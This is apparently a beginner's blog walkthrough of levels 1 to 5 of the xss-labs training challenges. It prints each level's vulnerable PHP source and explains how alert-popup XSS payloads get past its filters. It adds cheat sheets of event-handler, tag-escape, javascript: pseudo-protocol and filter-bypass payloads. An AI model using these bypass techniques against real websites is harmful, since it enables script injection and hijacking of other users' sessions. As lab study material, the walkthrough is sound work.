---
title: "Xss-labs Full Walkthrough & XSS Notes01"
publishDate: 2025-12-26 16:49:00
description: "Analysis and Notes"
tags: ["XSS", "Notes", "Web"]
language: "English"

---

> Notes compiled by a beginner for learning and reference. I am not a professional; please forgive any oversights. Acknowledgments to others and AI assistance where applicable.
> 
> I chose to present the source code directly (normally you cannot see the full backend source, only the page source). On one hand, this saves space used by trial-and-error payloads; on the other hand, it makes it more intuitive for future review without needing to run other tools. I believe most filtering methods can be discovered through testing—just try a few more times. (Okay, actually, I don't think anyone else will read this; it's mostly for my own review)

## Level 1

 Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.Analyzing from top to bottom, we can see that `window.alert `has been overridden by a custom function.

```php
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
```

2.We can see PHP code inserted into the HTML code.

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```

Here, `ini_set("display_errors", 0);` is used to suppress error messages.

Then, the value of **name** is obtained via a GET request and assigned to `$str`.

```php
echo "<h2 align=center>欢迎用户".$str."</h2>";
```

Clearly, this is our injection point. The passed value is inserted directly without any filtering.

3.We can simply construct a payload:

```html
?name=<script>alert(1)</script> //这里 alert()里面随便写什么都行
```

### Several Ways to Execute JS Code

| **Method**             | **Payload Example**            | **Applicable Scenario**         | **Remarks**                                       |
| ---------------------- | ------------------------------ | ------------------------------- | ------------------------------------------------- |
| **Standard Tags**      | `<script>alert(1)</script>`    | No filtering, direct output     | Most easily blocked                               |
| **Image Error**        | `<img src=1 onerror=alert(1)>` | `<script>` is filtered          | **Most common in combat**, triggers automatically |
| **Interaction Events** | `<div onmouseover=alert(1)>`   | `src` or `script` filtered      | Requires user interaction                         |
| **Pseudo-protocols**   | `<a href=javascript:alert(1)>` | Injection point inside `a` tag  | Common in clickable links                         |
| **SVG Tags**           | `<svg/onload=alert(1)>`        | Modern browsers, `img` filtered | HTML5 feature                                     |

## Level 2

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level3.php?writing=wait"; 
}
</script>
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
<center><img src=level2.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

* The core goal is still to trigger the alert method.

* Focusing on the `htmlspecialchars` function, we can see that the `h2` tag cannot be used as an injection point for the following reasons.

### htmlspecialchars

The **htmlspecialchars** method converts **predefined characters** into **HTML entities**. Simply put, it turns code symbols with "functional meaning" into pure "text display symbols". The browser sees the entity and only displays it, rather than executing it as code.

| **Input Character** | **Converted Entity** | **Meaning**                                |
| ------------------- | -------------------- | ------------------------------------------ |
| `&`                 | `&amp;`              | Ampersand                                  |
| `"`                 | `&quot;`             | **Double Quote** (Key point)               |
| `<`                 | `&lt;`               | Less than (Directly kills `<script>` tags) |
| `>`                 | `&gt;`               | Greater than                               |

By default (before PHP 8.1), it does not convert single quotes (`'`)!

The full syntax of this function is: `htmlspecialchars(string, flags, encoding)`

The `flags` parameter determines its defense level:

* **`ENT_COMPAT` (Old default):** Converts double quotes, **preserves single quotes**.

* **`ENT_QUOTES`:** Converts both double and single quotes.

* **`ENT_NOQUOTES`:** Converts neither.

Developers often lazily call `htmlspecialchars($str)` without adding the `ENT_QUOTES` parameter. **This gives us the opportunity to bypass it using "single quotes" for closure.**

3.Injection Point

```html
<input name=keyword  value="'.$str.'">
```

It is still direct concatenation (inside the input box). This `input` is insecure. Analysis shows we can close the first `"` after `value=` and insert our code.

4.We can construct the simplest payload. We can choose `input` attributes to insert.

```php
" onclick="alert(1) // Note there is only one " at the beginning to close the previous one, and pay attention to spaces
```

If you just want to pass the level, this is enough. Below are more diverse options.

Similarly, we can choose other attributes.

### `<input>` Tag XSS Trigger Attribute Cheat Sheet

| **Attribute**          | **Trigger Condition**                                            | **Payload Example**                         | **CTF/Real World Recommendation & Rating**                                                                                                                      |
| ---------------------- | ---------------------------------------------------------------- | ------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`onfocus`**          | **Triggered when the input field gets focus.**                   | `" onfocus=alert(1) autofocus="`            | Adding `autofocus` makes it focus automatically after page load, achieving **"Zero-click"** automatic XSS. However, it can easily cause infinite loops/freezes. |
| **`onmouseover`**      | **Triggered when the mouse pointer moves over the input.**       | `" onmouseover=alert(1) "`                  | Requires the user to hover. If the input box is large or conspicuous, the success rate is decent, but not as stable as automatic triggers.                      |
| **`onclick`**          | **Triggered when the user clicks the input.**                    | `" onclick=alert(1) "`                      | Requires active user click. This is the most passive method unless combined with social engineering to induce clicks.                                           |
| **`oninput`**          | **Triggered when the user types/modifies content in the input.** | `" oninput=alert(1) "`                      | Requires user input. Usually used in search boxes where users must type.                                                                                        |
| **`onchange`**         | **Triggered when content changes and focus is lost.**            | `" onchange=alert(1) "`                     | Harder to trigger; requires changing content and clicking elsewhere. Conditions are too strict.                                                                 |
| **`onblur`**           | **Triggered when the input loses focus.**                        | `" onblur=alert(1) autofocus="`             | Can be combined with `autofocus`. Once the user clicks elsewhere on the page (losing focus), it triggers.                                                       |
| **`oncut` / `oncopy`** | **Triggered when user cuts/copies content.**                     | `" value="Click to copy" oncopy=alert(1) "` | Useful only in very specific scenarios (e.g., inducing users to copy redemption codes).                                                                         |

> Note: There is basically a space before and after the `"` here.

Regarding the closure with `"`, there are other styles available, see the table below:

| **Style Type**           | **Example**          | **Rules & Limits**                                                                      |
| ------------------------ | -------------------- | --------------------------------------------------------------------------------------- |
| **Double Quote Wrapped** | `onclick="alert(1)"` | Standard style. Value can contain spaces, single quotes.                                |
| **Single Quote Wrapped** | `onclick='alert(1)'` | Standard style. Value can contain spaces, double quotes.                                |
| **Unquoted**             | `onclick=alert(1)`   | **As long as the value doesn't contain "destructive characters", quotes are optional.** |

What are "Destructive Characters"?

If you want to use the **Unquoted** style (`onclick=payload`), your payload **absolutely cannot contain** the following characters, otherwise the HTML parser will think the attribute value has ended:

* **Space** (Most critical limit)

* `"` (Double quote)

* `'` (Single quote)

* `=` (Equals sign)

* `<` (Less than)

* `>` (Greater than)

* `` ` `` (Backtick)

This level is relatively simple as it doesn't escape the content inside the input. We can also consider **Tag Escape** and **Pseudo-protocols**.

### Tag Escape

The backend **did not** escape/filter angle brackets `<` and `>`. **Attack Principle**: Use `>` to forcibly close the current `<input>` tag, then freely insert new HTML tags.

| **Attack Variant**          | **Condition**                                                                     | **Payload Example**                     | **Principle Analysis**                                                                                              |
| --------------------------- | --------------------------------------------------------------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| **Direct Script Insertion** | Ideal case, backend only checked quote closure, ignored tags.                     | `"> <script>alert(1)</script>`          | 1. `">` closes original input.<br>2. Browser executes the full JS script block.                                     |
| **Using img/svg**           | Backend filters `<script>` keyword, but not `< >`.                                | `"> <img src=x onerror=alert(1)>`       | 1. `">` closes original input.<br>2. Triggers `onerror` to execute JS due to image load failure (src=x).            |
| **Using body/iframe**       | Need more stealth or specific context, or `img` is monitored.                     | `"> <iframe onload=alert(1)>`           | 1. `">` closes original input.<br>2. Triggers `onload` when iframe finishes loading.                                |
| **Using input (Recursive)** | You want a popup but don't want to break page structure; looks like a normal box. | `"> <input onfocus=alert(1) autofocus>` | 1. `">` closes original input.<br>2. Insert a new input tag with attack attributes. Can still cause infinite loops. |

### Pseudo-protocols and Special Types

Unable to use `<script>` tags, and common `on*` events (like `onclick`, `onmouseover`) are filtered by WAF, but modifying the `type` attribute or URL-related attributes is allowed. **Attack Principle**: Utilize the browser's support for `javascript:` pseudo-protocols to disguise JS code as links or form submission targets.

| **Attack Variant**              | **Condition**                                                               | **Payload Example**                                | **Principle Analysis**                                                                                                                                                                                  |
| ------------------------------- | --------------------------------------------------------------------------- | -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Form Hijacking (Submit)**     | It's an input box, but you can change its `type` to `submit`.               | `" type="submit" formaction="javascript:alert(1)"` | 1. `type="submit"` transforms input into a submit button.<br>2. `formaction` overrides the original form action.<br>3. Click button -> Browser tries to jump to `javascript:alert(1)` -> Code executes. |
| **Image Button (Image)**        | Another way to turn input into a button (Older but works in some browsers). | `" type="image" src="javascript:alert(1)"`         | 1. `type="image"` makes it an image button.<br>2. Clicking attempts to execute pseudo-protocol code in src.<br>_(Note: Modern browsers defend this heavily, success rate lower than formaction)_        |
| **Hyperlink Hijacking (A Tag)** | **(Extension)** If your input is inside `<a href="...">` instead of input.  | `" href="javascript:alert(1)"`                     | 1. Directly close the preceding quote.<br>2. Clicking link triggers JS.<br>_(Common in href attribute injection scenarios)_                                                                             |

### Bypassing Filters

Not necessary or applicable for this level, but good to know.

When simple `onclick` or `<script>` is mercilessly blocked, replaced, or deleted by WAF (Firewall) or backend code.

| **Technique**               | **Condition**                                                                                                  | **Payload Example**                                                 | **Principle & Evaluation**                                                                                                                     |
| --------------------------- | -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| **Case Sensitivity Bypass** | Backend filter code **only matches lowercase**.<br>Ex: `str_replace("script", "", $str)`                       | `" OnIcK=alert(1) "<br>"> <ScRiPt>alert(1)</sCrIpT>`                | HTML is **case-insensitive** for tags and attributes, but backend filter code (PHP/Python/Java) might be case-sensitive.                       |
| **Double Writing Bypass**   | Backend replaces sensitive words **with empty string**, and **only once**.<br>Ex: Replaces `script` with `""`. | `"> <scrscriptipt>alert(1)</script>`<br>`" oonnfocus=alert(1) "`    | When the middle `script` is deleted, the remaining characters on left and right automatically combine to form `script` again.                  |
| **HTML Entity Encoding**    | Backend filters `alert`, `(`, etc., but not `&` and `#`.                                                       | `" onclick=&#97;lert(1) "`<br>`" onclick=alert&#40;1&#41; "`        | Browser parsing order: **HTML Decode -> JS Execute**. Browser sees `&#97;`, restores it to `a`, then hands it to JS engine to execute `alert`. |
| **Space Bypass**            | Backend filters spaces via Regex, preventing attribute separation.                                             | `"onfocus=alert(1)autofocus="`<br>`"type="text"/onfocus=alert(1)/*` | HTML parser allows using `/` (slash) instead of space to separate attributes.                                                                  |
| **Protocol Bypass**         | `javascript:` keyword is filtered.                                                                             | `" type="submit" formaction="java&#115;cript:alert(1)"`             | Use HTML entity encoding to break the keyword. `&#115;` is `s`; browser decodes it and still recognizes `javascript:`.                         |
| **Equivalent Function Sub** | `alert()` function is precisely banned.                                                                        | `confirm(1)`<br>`prompt(1)`<br>`top['al'+'ert'](1)`                 | Popups don't have to be `alert`; `confirm` and `prompt` work too. Or use JS string concatenation to bypass keyword detection.                  |

## Level 3

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level4.php?keyword=try harder!"; 
}
</script>
<title>欢迎来到level3</title>
</head>
<body>
<h1 align=center>欢迎来到level3</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>    
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
<center><img src=level3.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.Still triggering `alert`, won't elaborate.

2.Just like Level 2, the `echo` in h2 is escaped.

```php
<input name=keyword  value='".htmlspecialchars($str)."'>  
```

However, unlike the previous level where `$str` was passed directly, this level passes it through `htmlspecialchars`. [Click here to jump to htmlspecialchars](#htmlspecialchars)

Here we use its default behavior of not converting single quotes, and the problem explicitly hints at this by using `'`.

The rest is similar to the default payload of Level 2.

3.We can simply construct:

```php
' onclick='alert(1) 
```

Other attributes can be found [here](#input-tag-xss-trigger-attribute-cheat-sheet). Basically, the only difference is between single and double quotes.Also, try [Pseudo-protocols and Special Types](#pseudo-protocols-and-special-types); most should work.

## Level 4

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level5.php?keyword=find a way out!"; 
}
</script>
<title>欢迎来到level4</title>
</head>
<body>
<h1 align=center>欢迎来到level4</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level4.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>

```

1.Trigger `alert`.

2.Only `<` and `>` are filtered, and no escaping is performed. We can use `"` to close. This makes it easy; we can continue to mindlessly loop through [Attributes](#input-tag-xss-trigger-attribute-cheat-sheet).

```php
" onclick ="alert(1) 
```

## Level 5

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level6.php?keyword=break it out!"; 
}
</script>
<title>欢迎来到level5</title>
</head>
<body>
<h1 align=center>欢迎来到level5</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level5.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>


```

1.Trigger `alert`.

2.Here, uppercase is forcibly converted to lowercase, proving we cannot use Case Sensitivity Bypass.

```php
$str = strtolower($_GET["keyword"]);
```

3.We can see `<script` is replaced with `<scr_ipt` and `on` is replaced with `o_n`.

```php
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
```

3.Here we can combine [Pseudo-protocols and Special Types](#pseudo-protocols-and-special-types) and [Tag Escape](#tag-escape). We can construct:

```php
"> <a href="javascript:alert(1)">Click to pass</a>
```

4.Besides the casing replacement and keyword replacement (like `on` replacement in formaction) mentioned in the source code, there is another payload type issue related to browser security mechanisms.

Using image tags like `<input type="image" src="javascript:alert(1)">` or `<img src="javascript:alert(1)">` successfully bypasses all PHP filters and sends complete code to the browser.

**However**:

1. The browser sees the tag is `img` or `input type="image"`.

2. The browser thinks: "This is a static resource (image), its `src` should be a URL address."

3. The browser **prohibits** executing JS code in the `src` attribute of image resources.

4. The browser tries to load this "image," fails, shows a broken image icon, and **code is not executed**.

This means in modern browsers, `src` in image attributes will never execute scripts.

`<a>` is obviously the optimal solution.


